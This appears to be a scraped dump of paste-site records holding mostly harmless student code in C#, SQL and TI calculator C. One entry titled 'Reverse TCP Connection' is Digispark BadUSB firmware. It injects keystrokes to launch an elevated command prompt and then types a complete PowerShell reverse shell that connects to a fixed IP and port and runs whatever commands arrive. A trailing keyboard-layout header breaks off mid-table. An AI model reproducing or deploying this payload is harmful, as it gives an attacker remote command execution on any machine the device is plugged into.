url='/S6BumVkC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='MartinGeorgiev', title='01. Computer Store', content='using System;\n\xa0\nnamespace _01._Computer_Store\n{\n\xa0 class Program\n\xa0 {\n\xa0 \xa0 static void Main (string[]args)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 string partPrice = Console.ReadLine ();\n\xa0 \xa0 \xa0 double currentPrice = 0;\n\xa0 \xa0 \xa0 double totalPrice = 0;\n\xa0 \xa0 \xa0 double discont = 0;\n\xa0 \xa0 \xa0 while (partPrice != ""regular"")\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 if (partPrice == ""special"")\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 discont = totalPrice * 0.12;\n\xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 currentPrice = double.Parse (partPrice);\n\xa0\n\xa0 \xa0 \xa0 if (currentPrice < 0)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine (""Invalid price!"");\n\xa0 \xa0 \xa0 \xa0 \xa0 currentPrice = 0;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 totalPrice += currentPrice;\n\xa0 \xa0 \xa0 partPrice = Console.ReadLine();\n\xa0\n\xa0 \xa0 }\n\xa0 \xa0 \xa0 double priceWithTax = (totalPrice*1.2) - discont;\n\xa0 \xa0 \xa0 if (priceWithTax == 0)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 Console.WriteLine (""Invalid order!"");\n\xa0 \xa0 }\n\xa0 \xa0 \xa0 else\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 Console.WriteLine (""Congratulations you\'ve just bought a new computer!"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Price without taxes: {totalPrice:f2}$"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Taxes: {(totalPrice*0.2):f2}$"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""-----------"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Total price: {priceWithTax:f2}$"");\n\xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 }\n}', date='2022-06-01 13:36:31 +00:00', hash_val='149c96076478eb86b5b2fb838662095a', url='/nFymAiMC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='vvsvvs', title='Untitled', content='using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\xa0\nnamespace MealPlan\n{\n\xa0 \xa0 class Program\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 static void Main(string[] args)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Dictionary<string, int> mealsCalories = new Dictionary<string, int>\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""salad"", 350},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""soup"", 490},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""pasta"", 680},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""steak"", 790}\n\xa0 \xa0 \xa0 \xa0 };\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Queue<string> keysQueue = new Queue<string>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries));\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Stack<int> valuesStack = new Stack<int>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries).Select(int.Parse));\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int startMealsCount = keysQueue.Count; \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 while ((keysQueue.Count > 0) && (valuesStack.Count > 0))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int currentCallories = valuesStack.Pop();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int currentMealCallories = mealsCalories[keysQueue.Peek()];\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (currentCallories - currentMealCallories >= 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories -= currentMealCallories;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 valuesStack.Push(currentCallories); \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (valuesStack.Count > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories -= currentMealCallories;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories += valuesStack.Pop();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (currentCallories > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 valuesStack.Push(currentCallories);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 StringBuilder sb = new StringBuilder();\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""John had {startMealsCount} meals."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""For the next few days, he can eat {string.Join("", "", valuesStack)} calories."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""John ate enough, he had {startMealsCount - keysQueue.Count} meals."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""Meals left: {string.Join("", "", keysQueue)}."");\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine(sb.ToString().TrimEnd());\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}', date='2022-06-01 13:34:37 +00:00', hash_val='e816c4ce3fd5316828944cfe846e46d2', url='/CFxHbqkU', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="select \xa0name as exercise6\nfrom objects\nwhere level = 2 START WITH objects.name = 'Баришов Максим' \xa0\nCONNECT by prior objects.parent_id = object_id", date='2022-06-01 13:26:54 +00:00', hash_val='24dd6cc9c81ed1b0d571ac896b18fd38', url='/vAC6sJ5X', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='rafalou38', title='Untitled', content='#include <ti/getcsc.h>\n#include <sys/util.h>\n#include <graphx.h>\n#include <keypadc.h>\n\xa0\n#define width GFX_LCD_WIDTH\n#define height GFX_LCD_HEIGHT\n\xa0\n#define MUTATION_RATE 10\n\xa0\nint main(void)\n{\n\xa0\n\xa0 \xa0 uint32_t targetColor, pixelColor;\n\xa0 \xa0 int x, y, i, j, oi, oj;\n\xa0 \xa0 int newR, newG, newB;\n\xa0 \xa0 uint32_t grid[width][height];\n\xa0\n\xa0 \xa0 for (i = 0; i < width; i++)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < height; j++)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 grid[i][j] = 0x000000;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 // /* Initialize graphics drawing */\n\xa0 \xa0 gfx_Begin();\n\xa0\n\xa0 \xa0 grid[width / 2][height / 2] = 0xff6464;\n\xa0\n\xa0 \xa0 gfx_FillScreen(gfx_RGBTo1555(0, 0, 0));\n\xa0\n\xa0 \xa0 i = 0;\n\xa0 \xa0 while (true)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 //\n\xa0 \xa0 \xa0 \xa0 if (kb_IsDown(kb_Annul))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0\n\xa0 \xa0 \xa0 \xa0 for (x = 0; x < width; x++)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (y = 0; y < height; y++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // current pixel color on the old grid\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pixelColor = grid[x][y];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (pixelColor == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (oi = x - 1; oi <= x + 1; oi++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // wrap i\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 i = (oi + height) % height;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (oj = y - 1; oj <= y + 1; oj++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // wrap j\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 j = (oj + width) % width;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 targetColor = grid[i][j];\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // // if next cell is full ignore + randomness\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (targetColor != 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // mutate the new color\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newR = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newG = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newB = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 // /* End graphics drawing */\n\xa0 \xa0 gfx_End();\n\xa0\n\xa0 \xa0 return 0;\n}', date='2022-06-01 13:16:03 +00:00', hash_val='36b774247537106529f46b882c13b56a', url='/EbtiverJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Farliam', title='Reverse TCP Connection', content='#include ""GermanLayout.h""\n\xa0\n#define KEY_TAB 0x2b\n\xa0\nvoid setup() {\n\xa0 \xa0 DigiKeyboard.delay(500);\n\xa0 \xa0 pinMode(1, OUTPUT);\n}\n\xa0\nvoid StartAdminCMD(){\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n\xa0 DigiKeyboard.delay(500);\n\xa0 DigiKeyboardDe.println(""powershell \xa0Start-Process cmd -Verb runAs"");\n\xa0 DigiKeyboard.delay(1500);\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);\n\xa0 DigiKeyboard.delay(500);\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_ENTER);\n}\n\xa0\n\xa0\nvoid loop() {\n\xa0 DigiKeyboard.update();\n\xa0 DigiKeyboardDe.sendKeyStroke(0);\n\xa0\n\xa0 StartAdminCMD();\n\xa0 \n\xa0 DigiKeyboard.delay(1000);\n\xa0 DigiKeyboardDe.println(F(""powershell -command \\""$client = New-Object System.Net.Sockets.TCPClient(\'192.168.2.122\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd) + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"""")); \n\xa0 DigiKeyboard.delay(5000);\n\xa0 digitalWrite(1, HIGH); \n\xa0 DigiKeyboard.delay(90000);\n\xa0 digitalWrite(1, LOW);\n\xa0 DigiKeyboard.delay(5000);\n}\n\xa0\n//Remove .Path from (path)+\n//-windowstyle Maximized', date='2022-06-01 13:09:44 +00:00', hash_val='83c20c8c1f7a970af22ecea417e27d75', url='/a22PZrCN', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Farliam', title='GermanLayout.h', content='#include ""DigiKeyboard.h""\n#ifndef DIGIKEYBOARDDE_H\n#define DIGIKEYBOARDDE_H\n\xa0\n\xa0\n#define DE_MOD_CONTROL_LEFT \xa0 \xa0(1<<8)\n#define DE_MOD_SHIFT_LEFT \xa0 \xa0 \xa0(1<<9)\n#define DE_MOD_ALT_LEFT \xa0 \xa0 \xa0 \xa0(1<<10)\n#define DE_MOD_GUI_LEFT \xa0 \xa0 \xa0 \xa0(1<<11)\n#define DE_MOD_CONTROL_RIGHT \xa0 (1<<12)\n#define DE_MOD_SHIFT_RIGHT \xa0 \xa0 (1<<13)\n#define DE_MOD_ALT_RIGHT \xa0 \xa0 \xa0 (1<<14)\n#define DE_MOD_GUI_RIGHT \xa0 \xa0 \xa0 (1<<15)\nconst uint16_t _ascii_de_map[128] PROGMEM =\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // NUL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SOH\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // STX\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ETX\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // EOT\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ENQ\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ACK\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // BEL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2a, \xa0 \xa0 // BS Backspace\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2b, \xa0 \xa0 // TAB \xa0Tab\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x28, \xa0 \xa0 // LF Enter\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // VT\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // FF\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // CR\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SO\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SI\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DEL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC2\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC3\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC4\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // NAK\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SYN\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ETB\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // CAN\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // EM\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SUB\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ESC\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // FS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // GS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // RS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // US\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2c, \xa0 \xa0 \xa0// \xa0\' \'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1e|DE_MOD_SHIFT_LEFT, \xa0 \xa0// !\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1F|DE_MOD_SHIFT_LEFT, \xa0 \xa0// ""\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38, \xa0 \xa0// #\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x21|DE_MOD_SHIFT_LEFT, \xa0 \xa0// $\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x22|DE_MOD_SHIFT_LEFT, \xa0 \xa0// %\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x23|DE_MOD_SHIFT_LEFT, \xa0 \xa0// &\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x32|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// \'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25|DE_MOD_SHIFT_LEFT, \xa0 \xa0// (\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26|DE_MOD_SHIFT_LEFT, \xa0 \xa0// )\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30|DE_MOD_SHIFT_LEFT, \xa0 \xa0// *\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30, \xa0 \xa0// +\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x36, \xa0 \xa0 \xa0 \xa0 \xa0// ,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38, \xa0 \xa0 \xa0 \xa0 \xa0// -\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x37, \xa0 \xa0 \xa0 \xa0 \xa0// .\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// /\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27, \xa0 \xa0 \xa0 \xa0 \xa0// 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1e, \xa0 \xa0 \xa0 \xa0 \xa0// 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1f, \xa0 \xa0 \xa0 \xa0 \xa0// 2\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x20, \xa0 \xa0 \xa0 \xa0 \xa0// 3\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x21, \xa0 \xa0 \xa0 \xa0 \xa0// 4\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x22, \xa0 \xa0 \xa0 \xa0 \xa0// 5\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x23, \xa0 \xa0 \xa0 \xa0 \xa0// 6\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24, \xa0 \xa0 \xa0 \xa0 \xa0// 7\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25, \xa0 \xa0 \xa0 \xa0 \xa0// 8\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26, \xa0 \xa0 \xa0 \xa0 \xa0// 9\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x37|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// :\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x36|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// ;\n\xa0 \xa0 \xa0 